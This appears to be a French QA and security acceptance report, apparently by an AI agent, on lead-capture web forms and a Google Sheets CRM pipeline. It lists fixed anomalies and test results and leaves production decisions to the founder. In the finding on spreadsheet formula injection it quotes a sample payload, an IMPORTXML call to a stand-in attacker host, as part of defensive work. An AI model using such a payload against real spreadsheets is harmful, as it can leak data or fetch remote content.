# RAPPORT DE RECETTE FONCTIONNELLE, SÉCURITÉ ET VALIDATION AVANT PRODUCTION — MISSION AGIA-009

**Référence :** SYNTESIA-QA-RECETTE-009  
**Date d'exécution :** 21 novembre 2026  
**Dépôt & Branche :** `naitconv-web/agia-infrastructure` (`main`, base auditée : commit `26ac619`)  
**Garde-fous respectés :** `WEBHOOK_ENABLED = false` maintenu · `ENVIRONMENT = "PREPROD"` maintenu · Zéro donnée juridique inventée · Zéro publication publique · 0,00 € engagé.

---

## 1. RÉSUMÉ EXÉCUTIF & RÉPONSE AU CRITÈRE DE CLÔTURE

### Question de clôture : *« SYNTESIA est-elle techniquement prête à recevoir de vrais prospects ? »*

La recette indépendante menée en conditions réelles (moteur navigateur **Chromium Headless via Chrome DevTools Protocol**, banc d'exécution **Node.js VM sur `doPost(e)` Apps Script**, et **test d'écriture/lecture contrôlé en mode `TEST` sur le tableur Google Sheets réel `1EmC6f4ljLU2GZmD9HEBt50WdTlVXoQtPQ64vFQL1I_0`**) conduit à un double verdict strictement dissocié :

| Dimension évaluée | Verdict | Justification factuelle |
| :--- | :---: | :--- |
| **1. Aptitude Technique du Dispositif (Front-end, Validation, Sécurité CWE-1236/XSS, Responsive 4 largeurs & Schéma CRM 15 colonnes)** | **`GO TECHNIQUE` (Prêt à 100 %)** | • Les **8 anomalies techniques et de sécurité** découvertes lors du diagnostic initial sur le commit `26ac619` (dont une vulnérabilité P0 d'injection de formules Google Sheets `CWE-1236`, un écart P1 de barème de scoring effectif/budget et l'absence de verrou anti-double-soumission) ont été **intégralement corrigées et re-testées avec succès**.<br>• **`77 / 77` tests techniques exécutés sont au statut `TESTÉ ET RÉUSSI`** (`0` échec résiduel). |
| **2. Autorisation de Mise en Ligne Commerciale & Réception Réelle Directe depuis le Web Public** | **`NO-GO EN L'ÉTAT` (En attente des 5 actions du Fondateur)** | • Tant que `WEBHOOK_ENABLED` est verrouillé à `false` (par consigne de sécurité) et que le script `google_apps_script_crm_sync.js` n'est pas déployé en *Web App* avec son URL renseignée dans `syntesia-forms.js`, les formulaires web valident les données en local sans les envoyer sur Internet.<br>• Tant que les coordonnées juridiques définitives (SIREN/RCS, siège, directeur de publication, hébergeur, e-mail RGPD) ne sont pas renseignées dans `mentions-legales-confidentialite.html`, la page légale n'est pas juridiquement opposable pour une exploitation commerciale publique. |

---

## 2. PÉRIMÈTRE RÉELLEMENT TESTÉ

1. **Les 5 pages HTML du dépôt** chargées dans un véritable moteur **Chromium Headless (`/usr/bin/chromium` via CDP WebSocket)** sur les **4 largeurs d'écran exigées (`375 px`, `768 px`, `1024 px`, `1440 px`)** :
   - [sites/france/index.html](file:///home/antigravity/agia-infrastructure/sites/france/index.html) (`#leadFormSyntesiaFr`)
   - [sites/algerie/index.html](file:///home/antigravity/agia-infrastructure/sites/algerie/index.html) (`#leadFormSyntesiaDz`)
   - [sites/france/securite-privee/index.html](file:///home/antigravity/agia-infrastructure/sites/france/securite-privee/index.html) (`#formSecu`)
   - [sites/france/batiment-renovation/index.html](file:///home/antigravity/agia-infrastructure/sites/france/batiment-renovation/index.html) (`#formBtp`)
   - [sites/shared/mentions-legales-confidentialite.html](file:///home/antigravity/agia-infrastructure/sites/shared/mentions-legales-confidentialite.html)
2. **Le moteur partagé front-end :** [sites/shared/syntesia-forms.js](file:///home/antigravity/agia-infrastructure/sites/shared/syntesia-forms.js) et la feuille de style compilée [sites/shared/syntesia-design-system.css](file:///home/antigravity/agia-infrastructure/sites/shared/syntesia-design-system.css).
3. **Les deux moteurs d'ingestion CRM back-end :**
   - [automations/google_apps_script_crm_sync.js](file:///home/antigravity/agia-infrastructure/automations/google_apps_script_crm_sync.js) (exécuté en bac à sable Node.js simulant `SpreadsheetApp`, `LockService`, `ContentService`, `MailApp`, `Logger`).
   - [scripts/orchestrate_crm.py](file:///home/antigravity/agia-infrastructure/scripts/orchestrate_crm.py) (exécuté en réel contre l'onglet `01_PROSPECTS_LEADS` du tableur Google Sheets `1EmC6f4ljLU2GZmD9HEBt50WdTlVXoQtPQ64vFQL1I_0` avec une ligne marquée `TEST`).

---

## 3. ANOMALIES DÉTECTÉES SUR LE COMMIT `26ac619` (CLASSÉES P0 / P1 / P2) & CORRECTIONS RÉALISÉES

L'audit indépendant sans complaisance du commit `26ac619` a mis au jour **8 anomalies réelles** qui avaient échappé aux vérifications précédentes :

| ID | Priorité | Composant | Anomalie constatée avant correction | Correction réalisée & vérifiée | Statut final |
| :--- | :---: | :--- | :--- | :--- | :---: |
| **`ANOM-009-01`** | **P0** | `syntesia-forms.js`<br>`google_apps_script_crm_sync.js`<br>`orchestrate_crm.py` | **Vulnérabilité d'injection de formules Google Sheets (`CWE-1236`) et absence de limite de taille des champs :** Une saisie commençant par `=`, `+`, `-`, `@`, `\|` ou `%` (ex. `=IMPORTXML("http://evil.tld","//a")`) était transmise telle quelle à `appendRow` / `gsheets mutate append`, permettant l'exécution d'une formule dans le tableur CRM. | Implémentation de `sanitizeSheetField(str, maxLen)` dans les 3 fichiers : suppression des caractères de contrôle, troncature stricte par champ (`nom <= 120`, `description <= 2000`, rejet payload `> 15 Ko`) et préfixage par une apostrophe `'` de toute valeur débutant par `[=+\-@\|%]`. | **`CORRIGÉ & VÉRIFIÉ`** *(Preuve dans Google Sheets réel : `'=TEST_FORMULE_NEUTRALISEE_AGIA_009`)* |
| **`ANOM-009-02`** | **P1** | `syntesia-forms.js`<br>`google_apps_script_crm_sync.js`<br>`orchestrate_crm.py` | **Désalignement du barème de score (`+2`/`+3` pts) entre les listes déroulantes HTML et le moteur CRM + biais du texte par défaut `description` :**<br>1. `sites/france/index.html` envoie dans `name="budget"` des tranches d'effectif (`TPE`, `PME 10 à 49`, `PME 50 à 150`, `ETI > 150`) alors que le calcul de score ne cherchait que `"5 000"`, `"15 000"`, `"2 500"`.<br>2. Sur `securite-privee` et `batiment-renovation`, une description vide était remplacée par un texte par défaut de 42 caractères *avant* le calcul du score, attribuant à tort `+1 pt`. | 1. Unification du barème sur les 3 moteurs : reconnaissance des tranches en euros **et** des tranches de taille (`50 à 150`, `> 150`, `ETI` ➔ `+3 pts` ; `10 à 49`, `15 à 50`, `PME` ➔ `+2 pts` ; `TPE`, `1 à 9`, `1 à 15` ➔ `+1 pt`).<br>2. Calcul du bonus `+1 pt` de description uniquement sur la longueur réellement saisie par l'utilisateur (`rawDesc.length > 20`). | **`CORRIGÉ & VÉRIFIÉ`** |
| **`ANOM-009-03`** | **P1** | `syntesia-forms.js`<br>`google_apps_script_crm_sync.js`<br>`orchestrate_crm.py` | **Absence de blocage des doubles soumissions et de dédoublonnage CRM + fuseau horaire fixe `GMT+1` :**<br>1. Un utilisateur pouvait soumettre deux fois de suite le même formulaire avec les mêmes données.<br>2. Le serveur Apps Script n'inspectait pas les lignes récentes avant `appendRow` et utilisait `"GMT+1"` au lieu de `"Europe/Paris"` sans suffixe anti-collision sur `ID_Lead`. | 1. Côté client : verrouillage `isSubmitting` + `submitBtn.disabled = true` + registre d'empreintes `email\|verticale\|besoin` bloquant toute resoumission identique pendant 120 s (`DUPLICATE_SUBMISSION_BLOCKED`).<br>2. Côté serveur Apps Script : contrôle des 25 dernières lignes de `01_PROSPECTS_LEADS` (`DUPLICATE_LEAD`), fuseau `"Europe/Paris"` et suffixe aléatoire à 4 chiffres (`LEAD-yyyyMMdd-HHmmss-XXXX`). | **`CORRIGÉ & VÉRIFIÉ`** |
| **`ANOM-009-04`** | **P1** | `syntesia-forms.js`<br>`google_apps_script_crm_sync.js` | **Validation téléphone acceptant des balises HTML entourant 8 chiffres et erreur RGPD non différenciée :**<br>1. `tel.replace(/\D/g, "").length >= 8` acceptait `"<script>0612345678</script>"` ou 40 chiffres.<br>2. L'oubli de la seule case RGPD renvoyait le même code que l'oubli du nom. | 1. Validation stricte `/^[+\d\s().\-/]{8,25}$/` combinée à `8 <= digits <= 15` (norme E.164) côté client et serveur.<br>2. Code et message dédiés `VALIDATION_ERROR_RGPD` lorsque seule la case RGPD est décochée. | **`CORRIGÉ & VÉRIFIÉ`** |
| **`ANOM-009-05`** | **P2** | `google_apps_script_crm_sync.js`<br>`orchestrate_crm.py` | **Présence de données personnelles/entreprise dans les sorties de journaux (`stdout` / `Logger.log` / e-mail non chiffré) :** `orchestrate_crm.py` affichait le nom de l'entreprise dans `print()`, et l'e-mail d'alerte Apps Script incluait toutes les coordonnées personnelles en clair dans le corps du mail. | Purge complète des PII dans `print()`, `Logger.log` et l'e-mail de notification (qui ne mentionne plus que `idLead`, `marche`, `verticale`, `score`, `statut` et le lien vers le CRM sécurisé). | **`CORRIGÉ & VÉRIFIÉ`** |
| **`ANOM-009-06`** | **P2** | `securite-privee/index.html`<br>`batiment-renovation/index.html`<br>`syntesia-design-system.css` | **Retour à la ligne des liens de menu et boutons aux résolutions intermédiaires `768 px` et `1024 px` :**<br>1. À `768 px`, `securite-privee` et `batiment-renovation` affichaient déjà la barre de liens horizontale (`md:flex`), comprimant les liens sur 2 lignes.<br>2. À `1024 px` sur `france/index.html`, les liens de navigation et le bouton CTA passaient sur 2 lignes. | 1. Harmonisation du point de rupture menu mobile à `lg:` (`1024 px`) sur les 4 pages commerciales.<br>2. Ajout de `white-space: nowrap` sur les liens d'en-tête et boutons `.syn-btn-primary` / `.syn-btn-secondary` + espacement adaptatif `1.15rem` entre `1024 px` et `1279 px`. | **`CORRIGÉ & VÉRIFIÉ`** *(Captures `768px` et `1024px` validées)* |
| **`ANOM-009-07`** | **P2** | `syntesia-design-system.css`<br>`syntesia-forms.js` | **Accessibilité clavier et lecteur d'écran incomplète :** Absence de contour `:focus-visible` explicite sur tous les éléments interactifs et absence de `role="status" aria-live="polite"` sur les panneaux `#feedback...`. | Ajout de `a:focus-visible, button:focus-visible, input:focus-visible, select:focus-visible, textarea:focus-visible { outline: 2px solid var(--syn-ink); outline-offset: 2px; }` et injection automatique de `role="status" aria-live="polite"`. | **`CORRIGÉ & VÉRIFIÉ`** |
| **`ANOM-009-08`** | **P2** | `scripts/orchestrate_crm.py` | **Séparateur pipe `\|` interprété comme saut de ligne par le CLI `gsheets mutate append` :** Lors du test réel d'insertion dans Google Sheets, les caractères `\|` de la colonne N (`Notes_Diagnostic`) créaient des retours à la ligne dans la cellule. | Remplacement du séparateur `\|` par le point médian `·` dans `Notes_Diagnostic` de `orchestrate_crm.py`. | **`CORRIGÉ & VÉRIFIÉ`** |

---

## 4. RÉSULTATS DÉTAILLÉS PAR VOLET DU PÉRIMÈTRE OBLIGATOIRE

### A. Tests fonctionnels des 4 formulaires (Navigateur réel Chromium CDP)
- **40 cas de tests exécutés** (`10` scénarios × `4` formulaires : `#leadFormSyntesiaFr`, `#leadFormSyntesiaDz`, `#formSecu`, `#formBtp`) : **`40 / 40 TESTÉS ET RÉUSSIS`**.
- **Preuve détaillée :** Voir [MATRICE_TESTS_AGIA-009.md](file:///home/antigravity/agia-infrastructure/docs/sites/MATRICE_TESTS_AGIA-009.md).

### B. Vérification réelle du CRM (Correspondance 15 colonnes & Test en direct Google Sheets)
- **Correspondance des 15 colonnes (`A` à `O`) :** Vérifiée de bout en bout entre `syntesia-forms.js`, `google_apps_script_crm_sync.js`, `orchestrate_crm.py` et l'onglet réel `01_PROSPECTS_LEADS` :
  `A: ID_Lead` | `B: Date_Entree` | `C: Marche` | `D: Verticale_Metier` | `E: Entreprise` | `F: Contact_Nom` | `G: Email` | `H: Telephone` | `I: Besoin_Principal` | `J: Maturite_IA` | `K: Budget_Estime` | `L: Score_Qualification` | `M: Statut` | `N: Notes_Diagnostic` | `O: Environnement`.
- **Preuve de réception réelle en mode `TEST` dans Google Sheets (`1EmC6f4ljLU2GZmD9HEBt50WdTlVXoQtPQ64vFQL1I_0`) :**
  - Exécution de `ingest_lead(..., is_test=True)` puis lecture directe via `gsheets readonly read 1EmC6f4ljLU2GZmD9HEBt50WdTlVXoQtPQ64vFQL1I_0 "01_PROSPECTS_LEADS!A1:O10"`.
  - **Ligne réellement reçue et lue dans Google Sheets :**
    - `ID_Lead` : `LEAD-TEST-20261121-183904-4493`
    - `Date_Entree` : `2026-11-21 18:39:04` (`Europe/Paris`)
    - `Marche` : `France`
    - `Verticale_Metier` : `Sécurité Privée`
    - `Entreprise` : `[TEST_AGIA_009] Société Fictive Recette SAS`
    - `Email` : `recette.agia009@syntesia-test.invalid` (domaine réservé RFC 2606 `.invalid` — zéro prospect réel touché)
    - `Score_Qualification` : `10`
    - `Statut` : `TEST_QUALIFIE`
    - `Notes_Diagnostic` : inclut la preuve de neutralisation d'injection de formule `'=TEST_FORMULE_NEUTRALISEE_AGIA_009`
    - `Environnement` : `TEST`

### C. Sécurité
- **8 tests unitaires et sécurité exécutés sur `doPost(e)` (`GAS-01` à `GAS-08`) :** **`8 / 8 TESTÉS ET RÉUSSIS`**.
- **Revue complète documentée dans :** [AUDIT_SECURITE_AGIA-009.md](file:///home/antigravity/agia-infrastructure/docs/sites/AUDIT_SECURITE_AGIA-009.md).

### D. Interface et Accessibilité (5 pages × 4 résolutions : `375 px`, `768 px`, `1024 px`, `1440 px`)
- **20 tests de géométrie DOM (`scrollWidth <= innerWidth`) dans Chromium CDP :** **`20 / 20 TESTÉS ET RÉUSSIS`** (`0` débordement horizontal sur aucune des 5 pages aux largeurs `375 px`, `768 px`, `1024 px` et `1440 px`).
- **Tiroir de navigation mobile `#synMobileMenuBtn` :** Testé par clic programmatique CDP à `375 px` sur les 4 pages commerciales (`aria-expanded="false"` ➔ `"true"` à l'ouverture ➔ `"false"` et fermeture automatique au clic sur un lien d'ancre).
- **Accessibilité des formulaires :** `34 / 34` (`100 %`) des `<label for="...">` reliés aux `id` des champs, contour clavier `:focus-visible` actif et `role="status" aria-live="polite"` actif sur les 4 panneaux de retour.

### E. Mentions Légales et RGPD ([sites/shared/mentions-legales-confidentialite.html](file:///home/antigravity/agia-infrastructure/sites/shared/mentions-legales-confidentialite.html))
Conformément aux instructions de la section 3E, **la page n'est pas présentée comme juridiquement conforme pour la production tant que les informations du fondateur n'y figurent pas**. Voici l'état exact :

1. **Informations déjà renseignées dans la page :**
   - Nom commercial d'exploitation : `SYNTESIA`.
   - Finalité de la collecte B2B (analyse de la demande professionnelle et préparation d'un échange de diagnostic).
   - Base légale (consentement explicite Art. 6.1.a RGPD & mesures précontractuelles Art. 6.1.b RGPD).
   - Engagement de non-cession à des tiers et de non-entraînement de modèles IA publics.
   - Absence de cookies publicitaires et absence de requêtes tierces (0 transfert d'IP visiteur vers des CDN de polices ou scripts externes).
   - Mention des autorités de contrôle : CNIL (France) et ANPDP (Algérie — Loi n° 18-07).
   - Engagements d'éthique commerciale (jours ouvrés `08h30–19h00` conformément à l'Art. L.34-5 du CPCE, supervision humaine systématique).
2. **Informations manquantes (balisées `[À RENSEIGNER PAR LE FONDATEUR AVANT MISE EN LIGNE COMMERCIALE]`) :**
   - Dénomination sociale immatriculée, forme juridique et montant du capital social (Bloc 1.1).
   - Numéro d'immatriculation SIREN / SIRET / RCS et ville du greffe (Bloc 1.1).
   - Adresse postale officielle du siège social (Bloc 1.1).
   - Nom et prénom du Directeur de la publication / représentant légal (Bloc 1.1).
   - Adresse e-mail et numéro de téléphone de contact officiel de l'éditeur (Bloc 1.1).
   - Raison sociale, adresse postale et numéro de téléphone de l'hébergeur retenu (Bloc 1.2).
   - Adresse e-mail dédiée à l'exercice des droits RGPD / ANPDP (Bloc 2.5).
3. **Formulations et durées de conservation à valider juridiquement par le fondateur :**
   - *Durée de conservation des données prospects (Bloc 2.3)* : La durée proposée dans le texte actuel est de **trois (3) ans à compter du dernier contact émanant du prospect** (référentiel simplifié CNIL gestion commerciale) ou suppression immédiate sur demande. **Cette durée de 3 ans doit être formellement validée par le fondateur** (ou ajustée à 12/24 mois selon sa politique interne).
   - *Identité de l'entité opérant pour le marché Algérie* : Valider si le portail Algérie est édité par la même personne morale française (export de services B2B) ou par une structure locale algérienne distincte.

### F. Vérification technique finale
- **Chemins et dépendances :** `106 / 106` liens et scripts locaux résolus (`0` lien brisé).
- **Ressources externes :** `0` appel externe (`0` CDN JS, `0` Google Fonts externe).
- **Classes CSS :** `100 %` des classes utilisées dans les 5 fichiers HTML sont définies dans `sites/shared/syntesia-design-system.css` (`0` classe manquante).
- **Erreurs JavaScript :** `0` exception runtime (`Runtime.exceptionThrown = 0`) relevée par Chromium CDP sur l'ensemble des 5 pages.

---

## 5. DISTINCTION STRICTE DES STATUTS DE TESTS & VÉRIFICATIONS IMPOSSIBLES FAUTE D'ACCÈS

| Catégorie de vérification | Nombre de contrôles | Statut officiel | Détail & Motif factuel |
| :--- | :---: | :---: | :--- |
| **Tests fonctionnels navigateur (CDP Chromium : 4 formulaires × 10 cas)** | `40` | **`TESTÉ ET RÉUSSI`** | Exécutés dans `/usr/bin/chromium` via WebSocket CDP. |
| **Tests multi-viewports & absence d'overflow (`375, 768, 1024, 1440 px` × 5 pages)** | `20` | **`TESTÉ ET RÉUSSI`** | Mesure DOM `scrollWidth <= innerWidth` + captures PNG. |
| **Tests unitaires & sécurité serveur `doPost(e)` (`google_apps_script_crm_sync.js`)** | `8` | **`TESTÉ ET RÉUSSI`** | Exécutés dans Node.js VM (`GAS-01` à `GAS-08`). |
| **Test d'ingestion réelle Google Sheets en mode `TEST` (`orchestrate_crm.py` + `gsheets`)** | `1` | **`TESTÉ ET RÉUSSI`** | Ligne `LEAD-TEST-20261121-183904-4493` écrite et relue dans `01_PROSPECTS_LEADS`. |
| **Contrôles statiques (liens, labels A11y, 0 requête externe, CSS, métadonnées)** | `8` | **`TESTÉ ET RÉUSSI`** | Vérifiés sur les 5 fichiers HTML (`34/34` labels, `106/106` liens). |
| **Tests échoués non corrigés** | `0` | **`TESTÉ ET ÉCHOUÉ` : `0`** | Toutes les anomalies détectées ont été corrigées et re-validées. |
| **Appel HTTP `POST` en direct vers une URL Web App Google Apps Script déployée (`script.google.com/macros/s/.../exec`)** | `1` | **`IMPOSSIBLE À VÉRIFIER FAUTE D'ACCÈS / GARDE-FOU`** | 1. Le script Apps Script n'est pas encore déployé en Web App publique par le fondateur.<br>2. Aucun outil CLI `clasp` / API Apps Script n'est connecté à la VM.<br>3. Le garde-fou absolu de la mission impose de maintenir `WEBHOOK_ENABLED = false`. |
| **Envoi réel d'un e-mail de notification via `MailApp.sendEmail` depuis le compte Google du fondateur** | `1` | **`NON TESTÉ EN DIRECT (SIMULÉ EN VM)`** | Lié à l'exécution réelle du Web App Apps Script sur l'infrastructure Google du fondateur. |

---

## 6. RISQUES ENCORE OUVERTS & DÉCISIONS ATTENDUES DU FONDATEUR

### Risques encore ouverts (inhérents à l'architecture gratuite Google Apps Script)
1. **Quotas journaliers Google Apps Script (`MailApp` & exécutions simultannées) :** Google applique un plafond de ~100 à 1 500 e-mails/jour selon le type de compte Google (Gmail standard vs Google Workspace) et ~30 exécutions simultanées sur un Web App Apps Script. Largement suffisant pour le lancement organique B2B de SYNTESIA, mais à surveiller en cas de campagne publicitaire massive.
2. **Absence de CAPTCHA cryptographique serveur (ex. Cloudflare Turnstile) :** Le dispositif actuel combine **Honeypot multi-champs + Validation stricte format/longueur + Dédoublonnage 25 lignes + Verrou `LockService` 10 s**, ce qui bloque les robots génériques sans imposer de friction ni dépendance externe aux dirigeants prospects. Si le site subissait un jour une attaque ciblée contournant le honeypot, l'ajout d'un jeton Cloudflare Turnstile côté Apps Script pourra être activé en Phase 2 (`AGIA-010+`).

### Les 5 décisions attendues du fondateur pour autoriser ultérieurement la mise en ligne
Voir le détail opérationnel pas-à-pas dans [CHECKLIST_PRODUCTION_SYNTESIA.md](file:///home/antigravity/agia-infrastructure/docs/sites/CHECKLIST_PRODUCTION_SYNTESIA.md) :
1. Renseigner et valider les mentions légales et la durée de conservation RGPD (3 ans proposé) dans `sites/shared/mentions-legales-confidentialite.html`.
2. Choisir le nom de domaine et l'hébergeur.
3. Déployer `automations/google_apps_script_crm_sync.js` (v2.2) en Application Web dans Google Sheets.
4. Autoriser le passage de `WEBHOOK_ENABLED` à `true` et renseigner `WEBHOOK_URL` dans `sites/shared/syntesia-forms.js`.
5. Autoriser le retrait des mentions `[STATUT : INFRASTRUCTURE EN PRÉ-PRODUCTION]` et la publication sur l'hébergeur.

*(Note relative au complément stratégique : la prise en compte des exigences permanentes de conception/exploitation et le report des nouveaux développements à **`AGIA-010`** sont formellement enregistrés au §6 de [docs/ARCHITECTURE_GENERALE.md](file:///home/antigravity/agia-infrastructure/docs/ARCHITECTURE_GENERALE.md#L86-L103)).*
